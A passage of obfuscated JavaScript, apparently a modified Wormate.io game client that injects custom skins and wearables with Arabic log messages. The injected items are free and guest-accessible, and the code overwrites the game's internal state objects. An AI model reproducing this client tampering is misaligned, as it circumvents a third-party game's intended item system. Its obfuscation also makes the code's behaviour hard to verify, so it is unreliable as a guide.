              glow: _0xdfed7e.glow && Array.isArray(_0xdfed7e.glow) ? [..._0xdfed7e.glow] : Array(_0xdfed7e.base.length).fill("a_white"),
              custom: true,
              newSystem: true
            };
            while (_0x57c8ba.glow.length < _0x57c8ba.base.length) {
              _0x57c8ba.glow.push("a_white");
            }
            for (let _0x52917d = 0; _0x52917d < _0x57c8ba.glow.length; _0x52917d++) {
              if (!_0x57c8ba.glow[_0x52917d] || !_0x57c8ba.glow[_0x52917d].startsWith("a_") && !_0x57c8ba.glow[_0x52917d].startsWith("a__") && !_0x57c8ba.glow[_0x52917d].startsWith("a___") && !_0x57c8ba.glow[_0x52917d].startsWith("at_") && !_0x57c8ba.glow[_0x52917d].startsWith("at__") && !_0x57c8ba.glow[_0x52917d].startsWith("at___")) {
                _0x57c8ba.glow[_0x52917d] = "a_white";
              }
            }
            let _0xf36343 = -1;
            for (let _0x38043e = 0; _0x38043e < _0x196363.skinArrayDict.length; _0x38043e++) {
              if (_0x196363.skinArrayDict[_0x38043e].id === _0x57c8ba.id) {
                _0xf36343 = _0x38043e;
                break;
              }
            }
            if (_0xf36343 >= 0) {
              _0x196363.skinArrayDict[_0xf36343] = _0x57c8ba;
            } else {
              _0x196363.skinArrayDict.push(_0x57c8ba);
            }
            if (!_0x515122.list.includes(_0x57c8ba.id)) {
              _0x515122.list.push(_0x57c8ba.id);
            }
          }
        }
      });
      if (_0x515122.list.length > 0) {
        let _0x3c114b = false;
        for (let _0x18171f = 0; _0x18171f < _0x196363.skinGroupArrayDict.length; _0x18171f++) {
          if (_0x196363.skinGroupArrayDict[_0x18171f].id === _0x515122.id) {
            _0x196363.skinGroupArrayDict[_0x18171f] = _0x515122;
            _0x3c114b = true;
            break;
          }
        }
        if (!_0x3c114b) {
          _0x196363.skinGroupArrayDict.push(_0x515122);
        }
      }
    } catch (_0x4c1408) {
      console.error("❌ خطأ في معالجة النظام الجديد للسكنات:", _0x4c1408);
      console.error("Stack trace:", _0x4c1408.stack);
    }
  };
  _0x261341.validateSkinData = function (_0x4ed052) {
    let _0xba1c88 = [];
    Object.keys(_0x4ed052.regionDict).forEach(function (_0x468da5) {
      const _0x55a0d0 = _0x4ed052.regionDict[_0x468da5];
      if (_0x55a0d0.texture && !_0x4ed052.textureDict[_0x55a0d0.texture]) {
        _0xba1c88.push("منطقة " + _0x468da5 + " تشير لنسيج غير موجود: " + _0x55a0d0.texture);
      }
    });
    _0x4ed052.skinArrayDict.forEach(function (_0x5a75a4, _0x2fc429) {
      if (_0x5a75a4.base && Array.isArray(_0x5a75a4.base)) {
        _0x5a75a4.base.forEach(function (_0x479701) {
          if (!_0x4ed052.regionDict[_0x479701]) {
            _0xba1c88.push("سكن " + _0x5a75a4.id + " يشير لمنطقة غير موجودة: " + _0x479701);
          }
        });
      }
    });
    if (_0xba1c88.length > 0) {
      console.warn("⚠️ تم اكتشاف مشاكل في البيانات:");
      _0xba1c88.forEach(function (_0x2353fb, _0x41e24f) {
        console.warn(_0x41e24f + 1 + ". " + _0x2353fb);
      });
    } else {
      console.log("✅ جميع البيانات سليمة!");
    }
    return _0xba1c88;
  };
  _0x261341.processNewWearFormat = function (_0xeaf7e2, _0x3b3d7e) {
    try {
      if (!_0x3b3d7e.textureDict) {
        _0x3b3d7e.textureDict = {};
      }
      if (!_0x3b3d7e.regionDict) {
        _0x3b3d7e.regionDict = {};
      }
      if (!_0x3b3d7e.hatDict) {
        _0x3b3d7e.hatDict = {};
      }
      if (!_0x3b3d7e.eyesDict) {
        _0x3b3d7e.eyesDict = {};
      }
      if (!_0x3b3d7e.mouthDict) {
        _0x3b3d7e.mouthDict = {};
      }
      if (!_0x3b3d7e.glassesDict) {
        _0x3b3d7e.glassesDict = {};
      }
      if (!_0x3b3d7e.hatVariantArray) {
        _0x3b3d7e.hatVariantArray = [];
      }
      if (!_0x3b3d7e.eyesVariantArray) {
        _0x3b3d7e.eyesVariantArray = [];
      }
      if (!_0x3b3d7e.mouthVariantArray) {
        _0x3b3d7e.mouthVariantArray = [];
      }
      if (!_0x3b3d7e.glassesVariantArray) {
        _0x3b3d7e.glassesVariantArray = [];
      }
      Object.keys(_0xeaf7e2).forEach(function (_0x1b49a2) {
        if (_0x1b49a2.startsWith("custom_wear_") && _0xeaf7e2[_0x1b49a2].wear) {
          const _0xb67369 = _0xeaf7e2[_0x1b49a2].wear;
          if (_0xb67369.textureDict) {
            Object.keys(_0xb67369.textureDict).forEach(function (_0x4eb351) {
              const _0x5041ba = _0xb67369.textureDict[_0x4eb351];
              if (_0x5041ba && _0x5041ba.file) {
                let _0x532e09 = _0x5041ba.file;
                if (!_0x532e09.startsWith("data:image/")) {
                  _0x532e09 = _0x532e09.replace(/\s/g, "");
                  _0x532e09 = "data:image/png;base64," + _0x532e09;
                }
                _0x3b3d7e.textureDict[_0x4eb351] = {
                  custom: true,
                  h1: true,
                  h4: true,
                  file: _0x532e09,
                  relativePath: _0x532e09
                };
              }
            });
          }
          if (_0xb67369.regionDict) {
            Object.keys(_0xb67369.regionDict).forEach(function (_0x19660c) {
              const _0x2450e1 = _0xb67369.regionDict[_0x19660c];
              if (_0x2450e1 && _0x2450e1.id && _0x2450e1.obj && _0x2450e1.list) {
                const _0x5ee1c0 = _0x2450e1.list;
                const _0x4037bb = _0x2450e1.listVariant || _0x5ee1c0.replace("Dict", "VariantArray");
                if (!_0x3b3d7e[_0x5ee1c0]) {
                  _0x3b3d7e[_0x5ee1c0] = {};
                }
                if (!_0x3b3d7e[_0x4037bb]) {
                  _0x3b3d7e[_0x4037bb] = [];
                }
                _0x3b3d7e.regionDict[_0x19660c] = {
                  texture: _0x2450e1.texture,
                  x: _0x2450e1.x || 0,
                  y: _0x2450e1.y || 0,
                  w: _0x2450e1.w || 128,
                  h: _0x2450e1.h || 128,
                  px: _0x2450e1.px || 0,
                  py: _0x2450e1.py || 0,
                  pw: _0x2450e1.pw || 128,
                  ph: _0x2450e1.ph || 128
                };
                const _0x516383 = _0x2450e1.id;
                _0x3b3d7e[_0x5ee1c0][_0x516383] = {
                  base: _0x2450e1.obj.base || [{
                    region: _0x19660c
                  }],
                  guest: _0x2450e1.obj.guest !== undefined ? _0x2450e1.obj.guest : true,
                  price: _0x2450e1.obj.price || 0,
                  priceBefore: _0x2450e1.obj.priceBefore || 0,
                  nonbuyable: _0x2450e1.obj.nonbuyable !== undefined ? _0x2450e1.obj.nonbuyable : false,
                  prime: _0x2450e1.obj.prime || "c_white",
                  custom: true,
                  newSystem: true
                };
                if (!_0x3b3d7e[_0x4037bb].some(_0x21d3ce => _0x21d3ce[0] === _0x516383)) {
                  _0x3b3d7e[_0x4037bb].push([_0x516383]);
                }
                let _0x3900e0 = _0x5ee1c0.replace("Dict", "");
                if (_0x5ee1c0 === "hatDict") {
                  _0x3900e0 = "قبعة";
                } else if (_0x5ee1c0 === "eyesDict") {
                  _0x3900e0 = "عيون";
                } else if (_0x5ee1c0 === "mouthDict") {
                  _0x3900e0 = "فم";
                } else if (_0x5ee1c0 === "glassesDict") {
                  _0x3900e0 = "نظارة";
                }
                console.log("✅ تم إضافة " + _0x3900e0 + " جديد:", _0x516383);
              } else {
                console.warn("⚠️ منطقة غير مكتملة:", _0x19660c, _0x2450e1);
              }
            });
          }
        }
      });
      setTimeout(() => {
        if (window._wup?._anApp?.og?.af?.ng) {
          try {
            const _0x399107 = window._wup._anApp.og.af.ng;
            if (_0x399107.Ug && _0x399107.Ug.Uf) {
              _0x399107.Ug.Uf(_0x3b3d7e);
              console.log("✅ تم تحديث واجهة الأزياء!");
            }
          } catch (_0x3eac73) {
            console.log("تجربة تحديث:", _0x3eac73.message);
          }
        }
        if (window.gameManager) {
          Object.assign(window.gameManager, _0x3b3d7e);
        }
        if (window.gameInstance?.Lc) {
          window.gameInstance.Lc.Gb = _0x3b3d7e;
        }
      }, 500);
    } catch (_0x4ffe33) {
      console.error("❌ خطأ في معالجة النظام الجديد للأزياء:", _0x4ffe33);
      console.error("Stack trace:", _0x4ffe33.stack);
    }
  };
  function _0x462f3e(_0x38a42d, _0x23d572) {
    const _0x25a4eb = _0x38a42d.toLowerCase();
    if (_0x25a4eb.includes("eye") || _0x25a4eb.includes("عين") || _0x25a4eb.includes("pupil") || _0x25a4eb.includes("iris")) {
      return "eyes";
    }
    if (_0x25a4eb.includes("mouth") || _0x25a4eb.includes("فم") || _0x25a4eb.includes("lip") || _0x25a4eb.includes("smile")) {
      return "mouth";
    }
    if (_0x25a4eb.includes("hat") || _0x25a4eb.includes("قبعة") || _0x25a4eb.includes("cap") || _0x25a4eb.includes("helm")) {
      return "hat";
    }
    if (_0x25a4eb.includes("glass") || _0x25a4eb.includes("نظارة") || _0x25a4eb.includes("goggle") || _0x25a4eb.includes("spec")) {
      return "glasses";
    }
    if (_0x23d572 && _0x23d572.y !== undefined) {
      if (_0x23d572.y < 40) {
        return "hat";
      }
      if (_0x23d572.y > 90) {
        return "mouth";
      }
      return "eyes";
    }
    return "eyes";
  }
  _0x261341.bgg = function (_0x32096f) {
    _0x32096f = parseInt(_0x32096f);
    var _0x1322b1 = vps.backgroundUri || "/images/bg-pattern-pow2-ARENA.png";
    if (!isNaN(_0x32096f)) {
      _0x1322b1 = backgroundArena[_0x32096f]?.uri || _0x1322b1;
      vps.bgGameWidth = backgroundArena[_0x32096f]?.w || 512;
      vps.bgGameHeight = backgroundArena[_0x32096f]?.h || 256;
    }
    var _0xa2ea56 = PIXI.BaseTexture.from(_0x1322b1);
    vps.bgGameWidth = _0xa2ea56.width || vps.bgGameWidth || 512;
    vps.bgGameHeight = _0xa2ea56.height || vps.bgGameHeight || 256;
    _0xa2ea56.wrapMode = vps.bgGameWidth > 999 ? PIXI.WRAP_MODES.CLAMP : PIXI.WRAP_MODES.REPEAT;
    return new PIXI.Texture(_0xa2ea56);
  };
  _0x261341.genereteTexture = function (_0x47baba) {
    var _0x3abea3 = 128;
    var _0x428447 = 9;
    try {
      var _0xea5abf = function _0x4b4478() {
        var _0x4924c0 = [];
        for (var _0x44f4ee = 0; _0x44f4ee < _0x47baba.lines; _0x44f4ee++) {
          lineContainer = [];
          for (var _0x50e6b6 = 0; _0x50e6b6 < _0x428447; _0x50e6b6++) {
            try {
              var _0x24c8d2 = PIXI.Texture.from(_0x47baba._d, {
                x: _0x50e6b6 * _0x3abea3,
                y: _0x44f4ee * _0x3abea3,
                width: _0x3abea3,
                height: _0x3abea3
              });
              lineContainer.push(_0x24c8d2);
            } catch (_0x43a26e) {
              console.log(_0x44f4ee, _0x50e6b6);
              console.log(_0x43a26e);
              return;
            }
          }
          _0x4924c0.push(lineContainer);
        }
        return _0x4924c0;
      };
      return _0xea5abf();
    } catch (_0x2b8716) {
      return [];
    }
  };
  var _0x5c3995 = typeof Symbol == "function" && _0x1a561c(Symbol.iterator) == "symbol" ? function (_0xa8861) {
    return _0x1a561c(_0xa8861);
  } : function (_0x50f163) {
    if (_0x50f163 && typeof Symbol == "function" && _0x50f163.constructor === Symbol && _0x50f163 !== Symbol.prototype) {
      return "symbol";
    } else {
      return _0x1a561c(_0x50f163);
    }
  };
  var _0x507f56;
  window.addEventListener("load", function () {
    function _0x99e887() {
      (function (_0x485c33, _0x5229a1, _0x323416) {
        function _0x1f52b2(_0x3ca326, _0x50b471) {
          return (_0x3ca326 === undefined ? "undefined" : _0x5c3995(_0x3ca326)) === _0x50b471;
        }
        function _0x5868b9() {
          if (typeof _0x5229a1.createElement != "function") {
            return _0x5229a1.createElement(arguments[0]);
          } else if (_0x15991a) {
            return _0x5229a1.createElementNS.call(_0x5229a1, "http://www.w3.org/2000/svg", arguments[0]);
          } else {
            return _0x5229a1.createElement.apply(_0x5229a1, arguments);
          }
        }
        var _0x1ef17a = [];
        var _0x5b9257 = [];
        var _0x2fbc06 = {
          _version: "3.3.1",
          _config: {
            classPrefix: "",
            enableClasses: true,
            enableJSClass: true,
            usePrefixes: true
          },
          _q: [],
          on: function _0x3cb1ff(_0x51cce3, _0x16d727) {
            var _0x450a1a = this;
            setTimeout(function () {
              _0x16d727(_0x450a1a[_0x51cce3]);
            }, 0);
          },
          addTest: function _0x611c9c(_0x202158, _0x260a19, _0x30ca32) {
            _0x5b9257.push({
              name: _0x202158,
              fn: _0x260a19,
              options: _0x30ca32
            });
          },
          addAsyncTest: function _0xcaf578(_0x1e69ff) {
            _0x5b9257.push({
              name: null,
              fn: _0x1e69ff
            });
          }
        };
        var _0x5babbb = function _0x539300() {};
        _0x5babbb.prototype = _0x2fbc06;
        _0x5babbb = new _0x5babbb();
        var _0x5401c2 = false;
        try {
          _0x5401c2 = "WebSocket" in _0x485c33 && _0x485c33.WebSocket.CLOSING === 2;
        } catch (_0x3c1f9b) {}
        _0x5babbb.addTest("websockets", _0x5401c2);
        var _0x384492 = _0x5229a1.documentElement;
        var _0x15991a = _0x384492.nodeName.toLowerCase() === "svg";
        _0x5babbb.addTest("canvas", function () {
          var _0x42babb = _0x5868b9("canvas");
          return !!_0x42babb.getContext && !!_0x42babb.getContext("2d");
        });
        _0x5babbb.addTest("canvastext", function () {
          return _0x5babbb.canvas !== false && typeof _0x5868b9("canvas").getContext("2d").fillText == "function";
        });
        (function () {
          var _0x4b96d0;
          var _0x4759d2;
          var _0x486641;
          var _0x3de455;
          var _0x225f68;
          var _0x36d20b;
          var _0x3bd9d2;
          for (var _0x8edd00 in _0x5b9257) {
            if (_0x5b9257.hasOwnProperty(_0x8edd00)) {
              _0x4b96d0 = [];
              _0x4759d2 = _0x5b9257[_0x8edd00];
              if (_0x4759d2.name && (_0x4b96d0.push(_0x4759d2.name.toLowerCase()), _0x4759d2.options && _0x4759d2.options.aliases && _0x4759d2.options.aliases.length)) {
                for (_0x486641 = 0; _0x486641 < _0x4759d2.options.aliases.length; _0x486641++) {
                  _0x4b96d0.push(_0x4759d2.options.aliases[_0x486641].toLowerCase());
                }
              }
              _0x3de455 = _0x1f52b2(_0x4759d2.fn, "function") ? _0x4759d2.fn() : _0x4759d2.fn;
              _0x225f68 = 0;
              for (; _0x225f68 < _0x4b96d0.length; _0x225f68++) {
                _0x36d20b = _0x4b96d0[_0x225f68];
                _0x3bd9d2 = _0x36d20b.split(".");
                if (_0x3bd9d2.length === 1) {
                  _0x5babbb[_0x3bd9d2[0]] = _0x3de455;
                } else {
                  if (!!_0x5babbb[_0x3bd9d2[0]] && !(_0x5babbb[_0x3bd9d2[0]] instanceof Boolean)) {
                    _0x5babbb[_0x3bd9d2[0]] = new Boolean(_0x5babbb[_0x3bd9d2[0]]);
                  }
                  _0x5babbb[_0x3bd9d2[0]][_0x3bd9d2[1]] = _0x3de455;
                }
                _0x1ef17a.push((_0x3de455 ? "" : "no-") + _0x3bd9d2.join("-"));
              }
            }
          }
        })();
        (function (_0x3f4492) {
          var _0x54d20e = _0x384492.className;
          var _0x17a8ac = _0x5babbb._config.classPrefix || "";
          if (_0x15991a) {
            _0x54d20e = _0x54d20e.baseVal;
          }
          if (_0x5babbb._config.enableJSClass) {
            var _0x45442f = new RegExp("(^|\\s)" + _0x17a8ac + "no-js(\\s|$)");
            _0x54d20e = _0x54d20e.replace(_0x45442f, "$1" + _0x17a8ac + "js$2");
          }
          if (_0x5babbb._config.enableClasses) {
            _0x54d20e += " " + _0x17a8ac + _0x3f4492.join(" " + _0x17a8ac);
            if (_0x15991a) {
              _0x384492.className.baseVal = _0x54d20e;
            } else {
              _0x384492.className = _0x54d20e;
            }
          }
        })(_0x1ef17a);
        delete _0x2fbc06.addTest;
        delete _0x2fbc06.addAsyncTest;
        for (var _0x4a3f77 = 0; _0x4a3f77 < _0x5babbb._q.length; _0x4a3f77++) {
          _0x5babbb._q[_0x4a3f77]();
        }
        _0x485c33.Modernizr = _0x5babbb;
      })(window, document);
      return Modernizr.websockets && Modernizr.canvas && Modernizr.canvastext;
    }
    document.getElementById("game-wrap").style.display = "block";
    if (!_0x99e887()) {
      document.getElementById("error-view").style.display = "block";
      return;
    }
    (function () {
      function _0xe610a0() {
        return _0x380234;
      }
      var _0x31b4a1 = {};
      var _0x3c7003 = {};
      var _0x2c22d1 = {
        a: {
          r: window.runtimeHash,
          b: "https://gateway.wormate.io",
          c: "https://resources.wormate.io",
          d: "/images/linelogo-valday2024.png",
          e: "/images/guest-avatar-valday2025.png",
          f: "/images/confetti-valday2025.png",
          g: "/images/bg-event-pattern-valday2025.png"
        }
      };
      _0x2c22d1.a.i = function () {
        var _0x534a94 = window.I18N_LANG;
        _0x534a94 ||= "en";
        return _0x534a94;
      }();
      _0x2c22d1.a.j = function () {
        var _0x54eaf8 = undefined;
        switch (_0x2c22d1.a.i) {
          case "uk":
            _0x54eaf8 = "uk_UA";
            break;
          case "de":
            _0x54eaf8 = "de_DE";
            break;
          case "fr":
            _0x54eaf8 = "fr_FR";
            break;
          case "es":
            _0x54eaf8 = "es_ES";
            break;
          default:
            _0x54eaf8 = "en_US";
        }
        return _0x54eaf8;
      }();
      moment.locale(_0x2c22d1.a.j);
      var _0x131478 = function () {
        return {
          Container: PIXI.Container,
          BaseTexture: PIXI.BaseTexture,
          Texture: PIXI.Texture,
          Renderer: PIXI.Renderer,
          Graphics: PIXI.Graphics,
          Shader: PIXI.Shader,
          Rectangle: PIXI.Rectangle,
          Sprite: PIXI.Sprite,
          Text: PIXI.Text,
          Geometry: PIXI.Geometry,
          Mesh: PIXI.Mesh,
          v: {
            z: PIXI.BLEND_MODES.ADD,
            A: PIXI.BLEND_MODES.SCREEN,
            B: PIXI.BLEND_MODES.MULTIPLY
          },
          C: {
            D: PIXI.WRAP_MODES.REPEAT
          }
        };
      }();
      _0x3c7003.F = 6.283185307179586;
      _0x3c7003.G = Math.PI;
      _0x2c22d1.H = function (_0x5e94cf) {
        return window.I18N_MESSAGES[_0x5e94cf];
      };
      _0x2c22d1.I = function (_0x5a8b56) {
        if (_0x5a8b56[_0x2c22d1.a.i]) {
          return _0x5a8b56[_0x2c22d1.a.i];
        } else if (_0x5a8b56.en) {
          return _0x5a8b56.en;
        } else {
          return _0x5a8b56.x;
        }
      };
      _0x2c22d1.J = function (_0x172a0f) {
        var _0x1c9421 = (Math.floor(_0x172a0f) % 60).toString();
        var _0x57336d = (Math.floor(_0x172a0f / 60) % 60).toString();
        var _0x5c0c84 = (Math.floor(_0x172a0f / 3600) % 24).toString();
        var _0x1546dc = Math.floor(_0x172a0f / 86400).toString();
        var _0x25a63a = _0x2c22d1.H("util.time.days");
        var _0x484b3e = _0x2c22d1.H("util.time.hours");
        var _0x44c641 = _0x2c22d1.H("util.time.min");
        var _0x5b2f4e = _0x2c22d1.H("util.time.sec");
        if (_0x1546dc > 0) {
          return _0x1546dc + " " + _0x25a63a + " " + _0x5c0c84 + " " + _0x484b3e + " " + _0x57336d + " " + _0x44c641 + " " + _0x1c9421 + " " + _0x5b2f4e;
        } else if (_0x5c0c84 > 0) {
          return _0x5c0c84 + " " + _0x484b3e + " " + _0x57336d + " " + _0x44c641 + " " + _0x1c9421 + " " + _0x5b2f4e;
        } else if (_0x57336d > 0) {
          return _0x57336d + " " + _0x44c641 + " " + _0x1c9421 + " " + _0x5b2f4e;
        } else {
          return _0x1c9421 + " " + _0x5b2f4e;
        }
      };
      _0x2c22d1.K = function (_0x9cc1d3) {
        if (_0x9cc1d3.includes("href")) {
          return _0x9cc1d3.replaceAll("href", "target=\"_black\" href");
        } else {
          return _0x9cc1d3;
        }
      };
      _0x2c22d1.L = function (_0x2cd304, _0x5ded71, _0x22acca, _0x5605f2) {
        var _0x2aaf3c = document.createElement("script");
        var _0x5469c6 = true;
        if (_0x5c3995(_0x5ded71) !== "undefined" && _0x5ded71 !== null) {
          if (_0x5c3995(_0x5ded71.id) !== "undefined") {
            _0x2aaf3c.id = _0x5ded71.id;
          }
          if (_0x5c3995(_0x5ded71.async) !== "undefined" && _0x5ded71.async) {
            _0x2aaf3c.async = "async";
          }
          if (_0x5c3995(_0x5ded71.defer) !== "undefined" && _0x5ded71.defer) {
            _0x2aaf3c.defer = "defer";
          }
          if (_0x5c3995(_0x5ded71.crossorigin) !== "undefined") {
            _0x2aaf3c.crossorigin = _0x5ded71.crossorigin;
          }
        }
        _0x2aaf3c.type = _0x2aaf3c.type == _0x5605f2 ? "module" : "text/javascript";
        _0x2aaf3c.src = _0x2cd304;
        if (_0x22acca) {
          _0x2aaf3c.onload = _0x2aaf3c.onreadystatechange = function () {
            _0x5469c6 = false;
            try {
              _0x22acca();
            } catch (_0x834b6) {}
            _0x2aaf3c.onload = _0x2aaf3c.onreadystatechange = null;
          };
        }
        (document.head || document.getElementsByTagName("head")[0]).appendChild(_0x2aaf3c);
      };
      _0x2c22d1.M = function (_0x2b5bbb, _0x2b3344) {
        var _0x5db42c = _0x2b3344;
        _0x5db42c.prototype = Object.create(_0x2b5bbb.prototype);
        _0x5db42c.prototype.constructor = _0x5db42c;
        _0x5db42c.parent = _0x2b5bbb;
        return _0x5db42c;
      };
      _0x2c22d1.N = function (_0x3af19c) {
        _0x3af19c %= _0x3c7003.F;
        if (_0x3af19c < 0) {
          return _0x3af19c + _0x3c7003.F;
        } else {
          return _0x3af19c;
        }
      };
      _0x2c22d1.O = function (_0x3ad1c1, _0x4f5257, _0x1eef7d) {
        return _0x2c22d1.P(_0x1eef7d, _0x3ad1c1, _0x4f5257);
      };
      _0x2c22d1.P = function (_0x4dffa4, _0x50cf08, _0x56b755) {
        if (_0x4dffa4 > _0x56b755) {
          return _0x56b755;
        } else if (_0x4dffa4 < _0x50cf08) {
          return _0x50cf08;
        } else if (Number.isFinite(_0x4dffa4)) {
          return _0x4dffa4;
        } else {
          return (_0x50cf08 + _0x56b755) * 0.5;
        }
      };
      _0x2c22d1.Q = function (_0x5aeada, _0x12f660, _0x42b0d1, _0x176f3c) {
        if (_0x12f660 > _0x5aeada) {
          return Math.min(_0x12f660, _0x5aeada + _0x42b0d1 * _0x176f3c);
        } else {
          return Math.max(_0x12f660, _0x5aeada - _0x42b0d1 * _0x176f3c);
        }
      };
      _0x2c22d1.R = function (_0x14a4b7, _0x3b17a1, _0x34eee1, _0x4e3f5f, _0x10952e) {
        return _0x3b17a1 + (_0x14a4b7 - _0x3b17a1) * Math.pow(1 - _0x4e3f5f, _0x34eee1 / _0x10952e);
      };
      _0x2c22d1.S = function (_0x3f7ef7, _0x43f0da, _0x9bf150) {
        return _0x3f7ef7 - (_0x3f7ef7 - _0x43f0da) * _0x9bf150;
      };
      _0x2c22d1.T = function (_0x583d61, _0x4a347d, _0x3abb1e, _0x3730f1) {
        var _0x550269 = _0x3abb1e;
        var _0x1b36f2 = _0x4a347d;
        var _0x3cb62a = _0x4a347d + _0x3730f1;
        if (_0x583d61 == null) {
          throw new TypeError("this is null or not defined");
        }
        var _0x2eed7d = _0x583d61.length >>> 0;
        var _0x516b0e = _0x550269 >> 0;
        var _0x4a0ce5 = _0x516b0e < 0 ? Math.max(_0x2eed7d + _0x516b0e, 0) : Math.min(_0x516b0e, _0x2eed7d);
        var _0x37613e = _0x1b36f2 >> 0;
        var _0x33f620 = _0x37613e < 0 ? Math.max(_0x2eed7d + _0x37613e, 0) : Math.min(_0x37613e, _0x2eed7d);
        var _0x262305 = _0x3cb62a === undefined ? _0x2eed7d : _0x3cb62a >> 0;
        var _0x152938 = _0x262305 < 0 ? Math.max(_0x2eed7d + _0x262305, 0) : Math.min(_0x262305, _0x2eed7d);
        var _0x75bb45 = Math.min(_0x152938 - _0x33f620, _0x2eed7d - _0x4a0ce5);
        var _0x53e0dd = 1;
        for (_0x33f620 < _0x4a0ce5 && _0x4a0ce5 < _0x33f620 + _0x75bb45 && (_0x53e0dd = -1, _0x33f620 += _0x75bb45 - 1, _0x4a0ce5 += _0x75bb45 - 1); _0x75bb45 > 0;) {
          if (_0x33f620 in _0x583d61) {
            _0x583d61[_0x4a0ce5] = _0x583d61[_0x33f620];
          } else {
            delete _0x583d61[_0x4a0ce5];
          }
          _0x33f620 += _0x53e0dd;
          _0x4a0ce5 += _0x53e0dd;
          _0x75bb45--;
        }
        return _0x583d61;
      };
      _0x2c22d1.U = function (_0x3b282b) {
        if (_0x3b282b.parent != null) {
          _0x3b282b.parent.removeChild(_0x3b282b);
        }
      };
      _0x2c22d1.V = function (_0x3ef4e3, _0x1a2d04) {
        return _0x3ef4e3 + (_0x1a2d04 - _0x3ef4e3) * Math.random();
      };
      _0x2c22d1.W = function (_0x257884) {
        return _0x257884[parseInt(Math.random() * _0x257884.length)];
      };
      _0x2c22d1.X = function () {
        return Math.random().toString(36).substring(2, 15);
      };
      _0x2c22d1.Y = function (_0x2fd2ab, _0x55e17e, _0x1a2662) {
        var _0x2c6e97 = (1 - Math.abs(_0x1a2662 * 2 - 1)) * _0x55e17e;
        var _0x457b12 = _0x2c6e97 * (1 - Math.abs(_0x2fd2ab / 60 % 2 - 1));
        var _0x4f6c3f = _0x1a2662 - _0x2c6e97 / 2;
        if (_0x2fd2ab >= 0 && _0x2fd2ab < 60) {
          return [_0x4f6c3f + _0x2c6e97, _0x4f6c3f + _0x457b12, _0x4f6c3f + 0];
        } else if (_0x2fd2ab >= 60 && _0x2fd2ab < 120) {
          return [_0x4f6c3f + _0x457b12, _0x4f6c3f + _0x2c6e97, _0x4f6c3f + 0];
        } else if (_0x2fd2ab >= 120 && _0x2fd2ab < 180) {
          return [_0x4f6c3f + 0, _0x4f6c3f + _0x2c6e97, _0x4f6c3f + _0x457b12];
        } else if (_0x2fd2ab >= 180 && _0x2fd2ab < 240) {
          return [_0x4f6c3f + 0, _0x4f6c3f + _0x457b12, _0x4f6c3f + _0x2c6e97];
        } else if (_0x2fd2ab >= 240 && _0x2fd2ab < 300) {
          return [_0x4f6c3f + _0x457b12, _0x4f6c3f + 0, _0x4f6c3f + _0x2c6e97];
        } else {
          return [_0x4f6c3f + _0x2c6e97, _0x4f6c3f + 0, _0x4f6c3f + _0x457b12];
        }
      };
      _0x2c22d1.Z = function (_0x304317, _0x504d93, _0x45d9d7) {
        $.get(_0x304317).fail(_0x504d93).done(_0x45d9d7);
      };
      _0x2c22d1.$ = function (_0x543b3a, _0x10db36, _0x36a47e, _0x259eaa) {
        $.ajax({
          type: "GET",
          url: _0x543b3a,
          xhrFields: {
            responseType: "arraybuffer",
            onprogress: function _0x143179(_0x1f6054) {
              if (_0x1f6054.lengthComputable) {
                _0x259eaa(_0x1f6054.loaded / _0x1f6054.total * 100);
              }
            }
          }
        }).fail(_0x10db36).done(_0x36a47e);
      };
      _0x2c22d1._ = function (_0x60324e, _0x11dc37) {
        for (var _0x3b8738 in _0x60324e) {
          if (_0x60324e.hasOwnProperty(_0x3b8738)) {
            _0x11dc37(_0x3b8738, _0x60324e[_0x3b8738]);
          }
        }
      };
      _0x2c22d1.aa = function (_0x389570) {
        for (var _0x56421c = _0x389570.length - 1; _0x56421c > 0; _0x56421c--) {
          var _0x345e2a = Math.floor(Math.random() * (_0x56421c + 1));
          var _0x4920b0 = _0x389570[_0x56421c];
          _0x389570[_0x56421c] = _0x389570[_0x345e2a];
          _0x389570[_0x345e2a] = _0x4920b0;
        }
        return _0x389570;
      };
      (function () {
        var _0x997898 = 0;
        try {
          DataView.prototype.ba = function (_0x402138) {
            try {
              _0x997898 = _0x402138;
              return this.getInt8(_0x402138);
            } catch (_0x5248ae) {
              console.log(_0x997898);
              _0x380234.dh.mq.close();
              return 0;
            }
          };
          DataView.prototype.ca = function (_0x43f2d8) {
            try {
              _0x997898 = _0x43f2d8;
              return this.getInt16(_0x43f2d8);
            } catch (_0x12b414) {
              console.log(_0x997898);
              _0x380234.dh.mq.close();
              return 0;
            }
          };
          DataView.prototype.da = function (_0x1a5735) {
            try {
              _0x997898 = _0x1a5735;
              return this.getInt32(_0x1a5735);
            } catch (_0x3fafef) {
              console.log(_0x997898);
              _0x380234.dh.mq.close();
              return 0;
            }
          };
          DataView.prototype.ea = function (_0x279fae) {
            try {
              _0x997898 = _0x279fae;
              return this.getFloat32(_0x279fae);
            } catch (_0x14f94c) {
              console.log(_0x997898);
              _0x380234.dh.mq.close();
              return 0;
            }
          };
          DataView.prototype.fa = function (_0x40888a) {
            try {
              _0x997898 = _0x40888a;
              return this.getFloat64(_0x40888a);
            } catch (_0x2a7f7e) {
              console.log(_0x997898);
              _0x380234.dh.mq.close();
              return 0;
            }
          };
        } catch (_0x489a06) {
          console.log(_0x997898);
          console.error("Error adding methods to DataView prototype:", _0x489a06);
        }
      })();
      _0x2c22d1.ga = function () {
        function _0x12b91() {
          if (window.vps.s_l) {
            try {
              ga("send", "event", "antiadblocker", window.runtimeHash + "_complete");
            } catch (_0x201300) {}
            _0x4f3e2f(true);
          }
        }
        var _0x31ee95 = false;
        var _0x4f3e2f = function _0x51c52d() {};
        var _0xe49b43 = {};
        var _0x192514 = "JDHnkHtYwyXyVgG9";
        $("#adbl-continue").click(function () {
          $("#" + _0x192514).fadeOut(500);
          _0x4f3e2f(false);
        });
        _0xe49b43.ha = function (_0x1fb3f6) {
          _0x4f3e2f = _0x1fb3f6;
          if (!_0x31ee95) {
            try {
              aiptag.cmd.player.push(function () {
                aiptag.adplayer = new aipPlayer({
                  AD_WIDTH: 960,
                  AD_HEIGHT: 540,
                  AD_FULLSCREEN: true,
                  AD_CENTERPLAYER: false,
                  LOADING_TEXT: "loading advertisement",
                  PREROLL_ELEM: function _0x4eebae() {
                    return document.getElementById("1eaom01c3pxu9wd3");
                  },
                  AIP_COMPLETE: function _0x5c32b6(_0x9ba39d) {
                    _0x4f3e2f(true);
                    $("#1eaom01c3pxu9wd3").hide();
                    $("#" + _0x192514).hide();
                    try {
                      ga("send", "event", "preroll", window.runtimeHash + "_complete");
                    } catch (_0xee00fe) {}
                  },
                  AIP_REMOVE: function _0x298dda() {}
                });
              });
              _0x31ee95 = true;
